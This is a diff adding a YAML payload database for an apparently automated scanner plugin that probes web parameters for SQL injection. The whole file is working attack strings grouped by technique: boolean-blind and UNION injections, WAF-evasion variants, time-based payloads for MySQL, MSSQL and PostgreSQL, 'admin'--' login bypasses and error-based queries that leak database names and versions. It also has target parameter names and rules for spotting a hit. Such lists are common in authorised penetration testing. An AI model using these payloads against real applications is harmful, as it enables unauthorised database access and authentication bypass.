@@ -1,0 +1,111 @@
+# SQLi Payloads Database
+# Plugin: core.injection.sqli
+
+plugin_id: core.injection.sqli
+mutation_type: field_injection
+payload_type: sqli
+
+variants:
+  - id: boolean_blind
+    payloads:
+      - "' OR '1'='1"
+      - "' OR 1=1--"
+      - "\" OR \"1\"=\"1"
+      - "' OR 'a'='a"
+    tech_stack: [mysql, mariadb, postgresql, mssql, sqlite]
+    confidence_boost: 0.05
+    detection: status_code == 200 OR body_matches_any(sql_errors)
+
+  - id: union_basic
+    payloads:
+      - "1' UNION SELECT NULL,NULL,NULL--"
+      - "1' UNION SELECT NULL,NULL,NULL,NULL--"
+      - "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+      - "1 UNION SELECT NULL,NULL,NULL--"
+    tech_stack: [mysql, mariadb, postgresql, sqlite]
+    confidence_boost: 0.10
+    detection: column_count_match
+
+  - id: union_waf_bypass
+    payloads:
+      - "1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--"
+      - "1' OR 1=1/**/--"
+      - "1'%20UNION%20SELECT%20NULL,NULL,NULL--"
+    tech_stack: [mysql, mariadb]
+    confidence_boost: 0.12
+
+  - id: time_based_mysql
+    payloads:
+      - "1' AND SLEEP(5)--"
+      - "1' AND IF(1=1,SLEEP(5),0)--"
+      - "' OR SLEEP(5)--"
+    tech_stack: [mysql, mariadb]
+    detection: timing_delta > 4000
+    confidence_boost: 0.15
+
+  - id: time_based_mssql
+    payloads:
+      - "1' WAITFOR DELAY '0:0:5'--"
+      - "'; WAITFOR DELAY '0:0:5'--"
+    tech_stack: [mssql]
+    detection: timing_delta > 4000
+    confidence_boost: 0.15
+
+  - id: time_based_postgres
+    payloads:
+      - "1'; SELECT pg_sleep(5)--"
+      - "' OR pg_sleep(5)--"
+    tech_stack: [postgresql]
+    detection: timing_delta > 4000
+    confidence_boost: 0.15
+
+  - id: comment_bypass
+    payloads:
+      - "admin'--"
+      - "admin' #"
+      - "admin'/*"
+    tech_stack: [mysql, mariadb, postgresql, mssql]
+    confidence_boost: 0.08
+    detection: status_code == 200
+
+  - id: error_based
+    payloads:
+      - "1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--"
+      - "1' AND 1=CONVERT(int,@@version)--"
+      - "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--"
+    tech_stack: [mysql, mariadb, mssql]
+    detection: body_matches_any(sql_errors)
+    confidence_boost: 0.20
+
+  - id: url_encoded_bypass
+    payloads:
+      - "%27 OR %271%27%3D%271"
+      - "%27%20OR%201%3D1--"
+      - "%22%20OR%201%3D1--"
+    tech_stack: [mysql, mariadb, postgresql, mssql, sqlite]
+    confidence_boost: 0.07
+
+keywords:
+  - id
+  - search
+  - query
+  - filter
+  - where
+  - order
+  - sort
+  - name
+  - user
+  - username
+  - email
+  - keyword
+  - term
+
+expected_results:
+  union_basic:
+    indicator: column_count_match
+  time_based:
+    indicator: timing_anomaly
+  error_based:
+    indicator: sql_error_patterns
+  boolean_blind:
+    indicator: response_diff
